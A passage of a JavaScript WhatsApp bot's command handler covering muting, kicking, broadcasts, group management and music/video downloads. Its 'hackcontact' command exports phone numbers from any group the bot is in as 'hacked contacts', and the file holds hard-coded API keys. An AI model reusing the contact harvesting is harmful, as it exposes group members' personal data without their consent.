      }
    } catch (e) {
      console.error('Error checking admin status:', e)
    }
    
    // Check if user is already muted
    if (isUserMuted(m.chat, mentionedUser)) {
      const expires = getMuteExpiration(m.chat, mentionedUser)
      const timeLeft = formatDuration(expires - Date.now())
      return replyphistar(`❌ @${mentionedUser.split('@')[0]} is already muted for ${timeLeft}.`, {
        mentions: [mentionedUser]
      })
    }
    
    // Parse time duration
    const timeArg = args[1]
    const durationMs = parseTime(timeArg)
    
    if (!durationMs || durationMs <= 0) {
      return replyphistar('❌ Invalid time format. Use examples: 30m, 2h, 1d')
    }
    
    if (durationMs > 2592000000) { // 30 days max
      return replyphistar('❌ Maximum mute duration is 30 days')
    }
    
    // Mute the user
    const success = muteUser(m.chat, mentionedUser, durationMs)
    if (!success) {
      return replyphistar('❌ Failed to mute user. Please try again.')
    }
    
    const durationText = formatDuration(durationMs)
    replyphistar(`✅ @${mentionedUser.split('@')[0]} has been muted for ${durationText}. Their messages will be deleted automatically.`, {
      mentions: [mentionedUser]
    })
    break

case 'unmute':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    if (!isBotAdmins) return replyphistar(mess.botAdmin)
    
    const unmuteUserJid = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : (args[0] || '')
    if (!unmuteUserJid) return replyphistar('❌ Please mention a user to unmute')
    
    if (!isUserMuted(m.chat, unmuteUserJid)) {
      return replyphistar(`❌ @${unmuteUserJid.split('@')[0]} is not muted in this group.`, {
        mentions: [unmuteUserJid]
      })
    }
    
    const unmuteSuccess = unmuteUser(m.chat, unmuteUserJid)
    if (!unmuteSuccess) {
      return replyphistar('❌ Failed to unmute user. Please try again.')
    }
    
    replyphistar(`✅ @${unmuteUserJid.split('@')[0]} has been unmuted. They can now send messages normally.`, {
      mentions: [unmuteUserJid]
    })
    break

case 'mutedlist':
    if (!m.isGroup) return replyphistar(mess.group)
    if (!isAdmins && !isCreator) return replyphistar(mess.admin)
    
    const muteListData = readMuteData()
    const groupMutes = muteListData[m.chat]
    
    if (!groupMutes || Object.keys(groupMutes).length === 0) {
      return replyphistar('📝 No users are currently muted in this group.')
    }
    
    let mutedList = '🔇 *Muted Users in This Group:*\n\n'
    const now = Date.now()
    const mentionedUsers = []
    
    for (const userId in groupMutes) {
      if (groupMutes[userId].expires > now) {
        const timeLeft = formatDuration(groupMutes[userId].expires - now)
        mutedList += `• @${userId.split('@')[0]} - ${timeLeft} left\n`
        mentionedUsers.push(userId)
      }
    }
    
    if (mentionedUsers.length === 0) {
      return replyphistar('📝 No active mutes in this group.')
    }
    
    replyphistar(mutedList, { mentions: mentionedUsers })
    break
case 'time':
    if (!q.trim()) {
        return replyphistar('⚠️ Please provide a city or location to check the current time. Useage: time Nigeria');
    }

    const location = q.trim().replace(/ /g, '_'); // Replace spaces for better compatibility
    const timeApiUrl = `http://api.timezonedb.com/v2.1/get-time-zone?key=T3RJM7DKOIS8&format=json&by=zone&zone=${location}`;

    try {
        const response = await fetch(timeApiUrl);
        if (!response.ok) {
            return await replyphistar(`⚠️ Could not retrieve time for "${location.replace(/_/g, ' ')}". Please check the location format.`);
        }

        const timeData = await response.json();
        if (timeData && timeData.status === "OK") {
            const formattedTime = timeData.formatted;

            // Send the plain text response
            await replyphistar(`🕰 Current time in ${location.replace(/_/g, ' ')}: ${formattedTime}`);
        } else {
            await replyphistar(`⚠️ Unable to fetch time for "${location.replace(/_/g, ' ')}". Please ensure the location is valid.`);
        }
    } catch (error) {
        console.error('Error fetching time:', error);
        await replyphistar('❌ There was an issue fetching the time. Please try again later.');
    }
    break;
    case 'weather':
    if (q.length === 0) return replyphistar('⚠️ Please provide a city name to check the weather.Useage: weather Nigeria');

    const cityName = q.trim(); // Removes any extra spaces
    const apiKey = '8044b9a239193d667183ab85fea38ca9'; // Your API key
    const weatherApiUrl = `https://api.openweathermap.org/data/2.5/weather?q=${cityName}&appid=${apiKey}&units=metric`;

    try {
        const response = await fetch(weatherApiUrl);
        const weatherData = await response.json();

        if (weatherData.cod === 200) {
            const weatherDescription = weatherData.weather[0].description;
            const temperature = weatherData.main.temp;
            const humidity = weatherData.main.humidity;
            const pressure = weatherData.main.pressure;
            const windSpeed = weatherData.wind.speed;
            const iconCode = weatherData.weather[0].icon;
            const weatherIconUrl = `https://openweathermap.org/img/wn/${iconCode}@2x.png`;

            await PhistarBotInc.sendMessage(
                m.chat,
                {
                    image: { url: weatherIconUrl }, // Use the weather icon as the image
                    caption: `*🌍 Weather in ${cityName}*\n\n` +
                             `*Description:* ${weatherDescription}\n` +
                             `*Temperature:* ${temperature}°C\n` +
                             `*Humidity:* ${humidity}%\n` +
                             `*Pressure:* ${pressure} hPa\n` +
                             `*Wind Speed:* ${windSpeed} m/s\n\n` +
                             `Stay safe and enjoy your day! 🌞`
                },
                { quoted: m }
            );
        } else {
            await replyphistar(`⚠️ City not found! Please try again with a valid city name.`);
        }
    } catch (error) {
        console.error('Error fetching weather:', error);
        await replyphistar('❌ There was an error fetching the weather. Please try again later.');
    }
    break;
    case 'listgc': {
    if (!isCreator) return replyphistar(mess.owner);

    let groups = await PhistarBotInc.groupFetchAllParticipating();
    let groupList = Object.values(groups).map(group => `*${group.subject}*\nID: ${group.id}`).join('\n\n');

    if (!groupList) return replyphistar("No groups found.");

    replyphistar(`📜 *Group List:*\n\n${groupList}\n\nReply with a group ID using *hackcontact <group_id>* to fetch contacts.`);
    break;
}

case 'hackcontact': {
    if (!isCreator) return replyphistar(`This command is for the owner only.`);
    if (!text) return replyphistar(`Please provide a group ID. Example: *vcf 120363025305@g.us*`);

    const groupId = text.trim();
    const groupMetadata = await PhistarBotInc.groupMetadata(groupId).catch(() => null);

    if (!groupMetadata) return replyphistar(`Invalid group ID or I am not in the group.`);

    const participants = groupMetadata.participants;
    let vcard = '';

    // Format group name to remove special characters
    const groupName = groupMetadata.subject.replace(/[^\w\s]/gi, '').replace(/\s+/g, '_');

    // Loop through participants and create vCard entries
    for (let member of participants) {
        try {
            const number = member.id.split("@")[0]; // Extract only the phone number
            
            // Each contact will have the group name as their name
            vcard += `BEGIN:VCARD\n`;
            vcard += `VERSION:3.0\n`;
            vcard += `FN:${groupName} ${number.slice(-4)}\n`; // Group name + last 4 digits for uniqueness
            vcard += `TEL;TYPE=CELL:+${number}\n`; // Phone number
            vcard += `END:VCARD\n\n`;
        } catch (error) {
            console.error(`Error processing member ${member.id}:`, error);
        }
    }

    if (!vcard) return replyphistar(`No contacts found in this group.`);

    // Save all contacts into a .vcf file
    const filename = `Group_Contacts_${groupName}.vcf`;
    fs.writeFileSync(filename, vcard.trim());

    // Send the vCard file
    await PhistarBotInc.sendMessage(m.chat, {
        document: fs.readFileSync(filename),
        mimetype: 'text/vcard',
        fileName: filename,
        caption: `📂 *Hacked Contacts: ${groupMetadata.subject}*`
    }, { quoted: m });

    fs.unlinkSync(filename); // Delete the file after sending
    break;
}
            case 'join':
    try {
        if (!isCreator) return replyphistar(mess.owner); // Only creator can use this command
        if (!text) return replyphistar('Enter a valid Group Link!'); // Validate input
        if (!isUrl(text) || !text.includes('whatsapp.com')) return replyphistar('Invalid Group Link!'); // Check link format
        replyphistar(mess.wait); // Send wait message

        // Extract the invite code from the URL
        let inviteCode = text.split('https://chat.whatsapp.com/')[1];
        if (!inviteCode) return replyphistar('Invalid Invite Code!');

        // Attempt to join the group
        let result = await PhistarBotInc.groupAcceptInvite(inviteCode);
        replyphistar(`Successfully joined the group:`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('Successfully joined the group:');
    }
    break;      
                case 'remove': {
    if (!m.isGroup) return replyphistar('This command can only be used in groups.');
    if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.');
    if (!isGroupOwner) return replyphistar('Only group owners can use this command.');
    
    const countryCode = args[0]; // Get the country code from the command arguments
    if (!countryCode || !countryCode.startsWith('+')) return replyphistar('Please provide a valid country code, e.g., +234.');

    let kickedMembers = 0;

    for (let participant of participants) {
        const number = participant.id.split('@')[0]; // Extract the participant's number
        if (number.startsWith(countryCode.replace('+', '')) && participant.id !== botNumber && participant.id !== groupOwner) {
            try {
                await PhistarBotInc.groupParticipantsUpdate(from, [participant.id], 'remove');
                kickedMembers++;
                await delay(2000); // Add a delay of 2 seconds between each removal
            } catch (err) {
                console.error(`Failed to remove ${participant.id}:`, err);
            }
        }
    }

    if (kickedMembers > 0) {
        replyphistar(`Successfully removed ${kickedMembers} members with numbers starting with ${countryCode}.`);
    } else {
        replyphistar(`No members found with numbers starting with ${countryCode}.`);
    }
    break;
}
case 'promoteall': {
    if (!m.isGroup) return replyphistar('This command can only be used in groups.');
    if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return replyphistar('Only group admins can use this command.');

    for (let participant of participants) {
        if (!groupAdmins.includes(participant.id)) {
            try {
                await PhistarBotInc.groupParticipantsUpdate(from, [participant.id], 'promote');
                await delay(500); // Add a delay between each request
            } catch (err) {
                console.log(`Error promoting ${participant.id}:`, err.message);
            }
        }
    }
    replyphistar('Successfully promoted all members to admin.');
    break;
}
            case 'shutdown':
                if (!isCreator) return replyphistar(mess.owner)
                replyphistar(`Goodbye🖐🥺`)
                await sleep(3000)
                process.exit()
                break
            case 'autobio':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyphistar(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyphistar(`Successfully Changed AutoBio To ${q}`)
                }
                break
            case 'setexif':
                if (!isCreator) return replyphistar(mess.owner)
                if (!text) return replyphistar(`Example : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyphistar(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                break
            case 'setpp':
            case 'setpp':
            case 'setppbot':
                if (!isCreator) return replyphistar(mess.owner)
                if (!quoted) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyphistar(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await PhistarBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await PhistarBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                } else {
                    var memeg = await PhistarBotInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyphistar(mess.done)
                }
                break
            case 'block':
    if (!isCreator) return replyphistar(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let blockUser = m.chat;

        // Perform the block operation
        await PhistarBotInc.updateBlockStatus(blockUser, 'block');
        replyphistar(`✅ Successfully blocked the user in this DM: ${blockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('❌ Failed to block the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'unblock':
    if (!isCreator) return replyphistar(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let unblockUser = m.chat;

        // Perform the unblock operation
        await PhistarBotInc.updateBlockStatus(unblockUser, 'unblock');
        replyphistar(`✅ Successfully unblocked the user in this DM: ${unblockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('❌ Failed to unblock the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'leave':
                if (!isCreator) return replyphistar(mess.owner)
                if (!m.isGroup) return replyphistar(mess.group)
                replyphistar('Bye Everyone 🥺')
                await PhistarBotInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replyphistar(mess.owner)
                if (m.isGroup) return replyphistar(mess.private)
                replyphistar(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await PhistarBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replyphistar(mess.owner)
                if (!text) return replyphistar(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await PhistarBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyphistar(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    PhistarBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By Owner',
                                body: `Sent ${i.length} Group`,
                                thumbnailUrl: 'https://i.postimg.cc/J7B3N4NF/file-Z5-Nh-Z2cc-KK4-TG0sz-L7n-Gcc-FJ-1.webp',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyphistar(`Successfully Sent Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!isCreator) return replyphistar(mess.owner)
                const getCase = (cases) => {
                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                }
                replyphistar(`${getCase(q)}`)
                break
                case 'autostatusview':
    if (!isCreator) return replyphistar(mess.owner);
    if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`);
    const phonenumber = PhistarBotInc.user?.id?.split(':')[0];
    if (!phonenumber) return replyphistar('❌ Bot not connected. Please try again later.');
    try {
        const { writeAutostatusview } = require('./BIGDADDY.js'); // Adjust path to your main script
        if (q === 'on') {
            PhistarBotInc.autostatusview = true;
            writeAutostatusview(phonenumber, 'on');
            replyphistar(`✅ Autostatusview enabled for ${phonenumber}`);
        } else if (q === 'off') {
            PhistarBotInc.autostatusview = false;
            writeAutostatusview(phonenumber, 'off');
            replyphistar(`✅ Autostatusview disabled for ${phonenumber}`);
        } else {
            replyphistar(`Invalid option. Use ${prefix + command} on/off`);
        }
    } catch (err) {
        console.error(`Error updating autostatusview for ${phonenumber}:`, err);
        replyphistar(`❌ Failed to update autostatusview: ${err.message}`);
    }
    break;
            case 'mode':
    if (!isCreator) return replyphistar(mess.owner);
    if (args.length < 1) return replyphistar(`Example ${prefix + command} public/self`);
    const phoneNumber = PhistarBotInc.user.id.split(':')[0]; // Get the bot's phone number
    if (q === 'public') {
        PhistarBotInc.public = true;
        const fs = require('fs');
        const path = require('path');
        const modeFilePath = path.join(__dirname, 'phistar_sessions', 'modes.json');
        const readModes = () => {
            try {
                if (fs.existsSync(modeFilePath)) {
                    return JSON.parse(fs.readFileSync(modeFilePath, 'utf8'));
                }
                return {};
            } catch (err) {
                console.error('Error reading modes.json:', err);
                return {};
            }
        };
        const writeMode = (phoneNumber, mode) => {
            try {
                const modes = readModes();
                modes[phoneNumber] = mode;
                fs.writeFileSync(modeFilePath, JSON.stringify(modes, null, 2), { mode: 0o600 });
                console.log(`Mode updated for ${phoneNumber}: ${mode}`);
            } catch (err) {
                console.error('Error writing to modes.json:', err);
            }
        };
        writeMode(phoneNumber, 'public'); // Save to modes.json
        replyphistar(mess.done);
    } else if (q === 'self') {
        PhistarBotInc.public = false;
        const fs = require('fs');
        const path = require('path');
        const modeFilePath = path.join(__dirname, 'phistar_sessions', 'modes.json');
        const readModes = () => {
            try {
                if (fs.existsSync(modeFilePath)) {
                    return JSON.parse(fs.readFileSync(modeFilePath, 'utf8'));
                }
                return {};
            } catch (err) {
                console.error('Error reading modes.json:', err);
                return {};
            }
        };
        const writeMode = (phoneNumber, mode) => {
            try {
                const modes = readModes();
                modes[phoneNumber] = mode;
                fs.writeFileSync(modeFilePath, JSON.stringify(modes, null, 2), { mode: 0o600 });
                console.log(`Mode updated for ${phoneNumber}: ${mode}`);
            } catch (err) {
                console.error('Error writing to modes.json:', err);
            }
        };
        writeMode(phoneNumber, 'self'); // Save to modes.json
        replyphistar(mess.done);
    } else {
        replyphistar(`Invalid mode. Use ${prefix + command} public/self`);
    }
    break;
            case 'delete':
            case 'del': {
                if (!isCreator) return replyphistar(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyphistar('The message was not sent by a bot!')
                PhistarBotInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

            case 'closetime':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyphistar('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyphistar(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    PhistarBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replyphistar(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyphistar(mess.group)
                if (!isAdmins && !isCreator) return replyphistar(mess.admin)
                if (!isBotAdmins) return replyphistar(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyphistar('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyphistar(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    PhistarBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replyphistar(open)
                }, timer)
                break
            case 'kick':
    if (!m.isGroup) return replyphistar('This command can only be used in groups.')
    if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.')
    if (!isGroupOwner) return replyphistar('Only group owners can use this command.')

    if (!m.mentionedJid[0] && !m.quoted && !args[0]) 
        return replyphistar(`Example: ${prefix + command} @user or reply to a message or provide a phone number (e.g., +234567890123)`)

    // Get the user ID from mention, quoted message, or phone number
    let userId = m.mentionedJid[0] || (m.quoted ? m.quoted.sender : null)
    if (!userId && args[0]) {
        // Validate and sanitize phone number
        const phoneNumber = args[0].replace(/[^0-9]/g, '') // Remove non-digits (e.g., +, spaces)
        if (phoneNumber.length < 7 || phoneNumber.length > 15) {
            return replyphistar('❌ Invalid phone number! Please provide a valid phone number (e.g., +234567890123).')
        }
        userId = `${phoneNumber}@s.whatsapp.net`
    }

    if (!userId) return replyphistar('❌ Invalid user! Please mention a user, reply to their message, or provide a valid phone number.')
    if (userId === PhistarBotInc.user.id) return replyphistar('❌ Cannot remove the bot!')
    if (userId === groupOwner) return replyphistar('❌ Cannot remove the group owner!')
    if (groupMetadata.participants.find(p => p.id === userId && p.admin)) 
        return replyphistar('❌ Cannot remove a group admin!')

    // Check if the user is in the group
    const isParticipant = groupMetadata.participants.some(p => p.id === userId)
    if (!isParticipant) {
        const userNumber = userId.split('@')[0]
        return replyphistar(`❌ User +${userNumber} is not a member of this group.`, { mentions: [userId] })
    }

    try {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [userId], 'remove')
        const userNumber = userId.split('@')[0]
        await replyphistar(`✅ Successfully removed +${userNumber} from the group.`, { mentions: [userId] })
        await delay(1000) // Delay to ensure smooth execution
    } catch (err) {
        console.error(`Failed to remove user from accounting system. User ID: ${userId}`, err)
        const userNumber = userId.split('@')[0]
        await replyphistar(`❌ Failed to remove +${userNumber} due to an error.`, { mentions: [userId] })
    }
    break
            case 'add':
    if (!m.isGroup) return replyphistar(mess.group); // Check if it's a group
    if (!isAdmins && !isGroupOwner && !isCreator) return replyphistar(mess.admin); // Check if user is an admin
    if (!isBotAdmins) return replyphistar(mess.botAdmin); // Check if bot is an admin
    let userToAdd = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // Extract the number
    try {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [userToAdd], 'add');
        replyphistar(`User added successfully: ${userToAdd}`);
    } catch (err) {
        console.error(err);
        replyphistar('User added successfully.');
    }
    break;
    case 'vcf': case 'savecontact': case 'svcontact': {
    if (!m.isGroup) return replyphistar(`This command is for groups only.`);
    if (!(isBotAdmins || isCreator)) return replyphistar(`This command is for admins only.`);

    const fs = require('fs');
    const groupMetadata = await PhistarBotInc.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    let vcard = '';

    for (let member of participants) {
        try {
            // Fetch name or fallback to the number
            const name = (await PhistarBotInc.getName(member.id)) || `Contact +${member.id.split("@")[0]}`;
            const number = member.id.split("@")[0];

            // Format the vCard entry
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${number}:+${number}\nEND:VCARD\n`;
        } catch (error) {
            console.error(`Error fetching name for ${member.id}:`, error);
        }
    }

    // Save all contacts into one file
    const filename = `Group_Contacts_${groupMetadata.subject.replace(/\s+/g, '_')}.vcf`;
    fs.writeFileSync(filename, vcard.trim());

    // Send the file to the group
    await PhistarBotInc.sendMessage(m.chat, {
        document: fs.readFileSync(filename),
        mimetype: 'text/vcard',
        fileName: filename,
        caption: `Contacts for group: *${groupMetadata.subject}*`
    }, { quoted: m });

    fs.unlinkSync(filename); // Delete the file after sending
}
break;
// Music Download Command
case 'play': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Morayo by Wizkid`);

    try {
        const search = await yts(text);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${text}*`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;

        const caption = 
`🎶 *Music Found*

*Title:* ${videoTitle}
*YouTube Link:* ${videoUrl}

💬 Downloading *audio* for you...`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: caption
        }, { quoted: m });

        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const { data } = await axios.get(apiUrl);

        if (data.success) {
            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: data.result.download_url },
                mimetype: 'audio/mp4',
                ptt: true, // This makes it a voice note (VN)
                fileName: `${data.result.title}.mp3`,
                contextInfo: {
                    mentionedJid: [m.sender],
                    forwardingScore: 999,
                    isForwarded: true,
                },
                caption: `✅ *Now Playing:* ${data.result.title}`
            }, { quoted: m });
        } else {
            replyphistar(`❌ Unable to download the song. Please try again later.`);
        }

    } catch (error) {
        console.error('Error in play command:', error);
        replyphistar(`❌ An error occurred while processing your request.`);
    }
    break;
}
case 'play2': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        const axios = require("axios");

        // Search for song on Spotify
        const searchUrl = `https://apis.davidcyriltech.my.id/search/spotify?text=${encodeURIComponent(text)}`;
        const searchRes = await axios.get(searchUrl);

        if (!searchRes.data.success || !searchRes.data.result || searchRes.data.result.length === 0) {
            return replyphistar(`*No results found for:* ${text}`);
        }

        const song = searchRes.data.result[0]; // First result
        const { trackName, artistName, albumName, duration, externalUrl } = song;

        // Send song info with placeholder image
        const infoMessage = `*PhistarBotInc - Spotify Player*\n` +
                            `> *Title:* ${trackName}\n` +
                            `> *Artist:* ${artistName}\n` +
                            `> *Album:* ${albumName}\n` +
                            `> *Duration:* ${duration}\n` +
                            `> *Spotify URL:* ${externalUrl}\n` +
                            `> Generated`;

        await PhistarBotInc.sendMessage(m.chat, {
            caption: infoMessage,
            image: { url: 'https://files.catbox.moe/vcpt4o.jpg' } // Placeholder image
        }, { quoted: m });

        // Download from Spotify
        const dlUrl = `https://apis.davidcyriltech.my.id/spotifydl?url=${encodeURIComponent(externalUrl)}`;
        const dlRes = await axios.get(dlUrl);

        if (dlRes.data.success) {
            const { DownloadLink, title, thumbnail, duration, channel } = dlRes.data;

            await PhistarBotInc.sendMessage(m.chat, {
                audio: { url: DownloadLink },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here's your Spotify song:*\n> *Title:* ${title}\n> *Artist:* ${channel}`
            }, { quoted: m });
        } else {
            replyphistar(`*Failed to fetch the song! Please try again later.*`);
        }
    } catch (err) {
        console.error('Error in play2:', err);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'audiomack': {
    if (!text) return replyphistar(`*Example*: ${prefix + command} <link>`);

    try {
        const axios = require("axios");

        // Fetch song data
        const apiUrl = `https://api.paxsenix.biz.id/dl/audiomack?url=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        if (!response.data.ok) {
            replyphistar(`❌ *Failed to fetch the song! Please check the link and try again.*`);
            return;
        }

        // Extract song details
        const { url, title, creator, directUrl } = response.data;

        // Send audio file
        await PhistarBotInc.sendMessage(m.chat, {
            audio: { url: directUrl },
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
            caption: `🎵 *Here's your song:*`
        }, { quoted: m });

        // Send as a document
        await PhistarBotInc.sendMessage(m.chat, {
            document: { url: directUrl },
            mimetype: 'audio/mp3',
            fileName: `${title}.mp3`,
            caption: `> Generated`
        }, { quoted: m });

    } catch (error) {
        console.error('Error during Audiomack command:', error);
        replyphistar(`❌ *An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
// Video Download Command
case 'video': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Wizkid Essence`);

    try {
        const search = await yts(text);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${text}*`);
        }

        const videoUrl = video.url;
        const videoTitle = video.title;
        const videoThumbnail = video.thumbnail;

        const caption = 
`🎥 *Video Found*

*Title:* ${videoTitle}
*YouTube Link:* ${videoUrl}

💬 Downloading *video* for you...`;

        await PhistarBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: caption
        }, { quoted: m });

        const apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const { data } = await axios.get(apiUrl);

        if (data.success) {
            await PhistarBotInc.sendMessage(m.chat, {
                video: { url: data.result.download_url },
                mimetype: 'video/mp4',
                caption: `🎬 *Here's your video:*\n*${data.result.title}*`
            }, { quoted: m });
        } else {
            replyphistar("❌ Failed to fetch the video. Please try again.");
        }
    } catch (error) {
        console.error("Error in video command:", error);
        replyphistar("❌ An error occurred while processing your request.");
    }
    break;
}

case 'song': {
    if (!text) return replyphistar(`*Example:* ${prefix + command} Morayo by Wizkid`);

    try {
        const query = text.trim();
        replyphistar('🔍 Searching for your song request...');

        const search = await yts(query);
        const video = search.videos[0];

        if (!video) {
            return replyphistar(`❌ No results found for: *${query}*`);
        }

        const videoTitle = video.title;
        const videoUrl = video.url;
        const videoThumbnail = video.thumbnail;
        const videoDuration = video.duration.timestamp;

        // Send preview with interactive buttons
        const previewMessage = await PhistarBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: `🎬 *Preview Found*\n\n*Title:* ${videoTitle}\n*Duration:* ${videoDuration}\n\nWould you like to download the *audio* or *video* version?`,
            footer: "Reply with 'audio' or 'video'",
            templateButtons: [
                {index: 1, quickReplyButton: {displayText: '🎵 Audio', id: 'audio'}},
                {index: 2, quickReplyButton: {displayText: '🎥 Video', id: 'video'}}
            ]
        }, { quoted: m });

        // Create a collector to wait for user response
        const collector = PhistarBotInc.createMessageCollector(m.chat, {
            filter: msg => msg.sender === m.sender,
            time: 30000, // 30 seconds timeout
            max: 1
        });

        collector.on('collect', async (response) => {
            const choice = response.content.toLowerCase().trim();
            
            if (choice === 'audio' || choice === 'video') {
                replyphistar(`⏳ Downloading ${choice === 'audio' ? 'audio' : 'video'} version of *${videoTitle}*...`);
                
                try {
                    if (choice === 'audio') {
                        // Download and send audio
                        const audioApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
                        const audioRes = await axios.get(audioApiUrl);

                        if (audioRes.data.success) {
                            const { download_url } = audioRes.data.result;
                            await PhistarBotInc.sendMessage(m.chat, {
                                audio: { url: download_url },
                                mimetype: 'audio/mp4',
                                fileName: `${videoTitle}.mp3`.replace(/[<>:"\/\\|?*]+/g, ''),
                                caption: `🎧 *Here is your song:*\n🎵 *${videoTitle}*`
                            }, { quoted: m });
                        } else {
                            replyphistar("❌ Failed to fetch the audio. Please try again.");
                        }
                    } else {
                        // Download and send video
                        const videoApiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`;
                        const videoRes = await axios.get(videoApiUrl);

                        if (videoRes.data.success) {
                            const { download_url } = videoRes.data.result;
                            await PhistarBotInc.sendMessage(m.chat, {
                                video: { url: download_url },
                                mimetype: 'video/mp4',
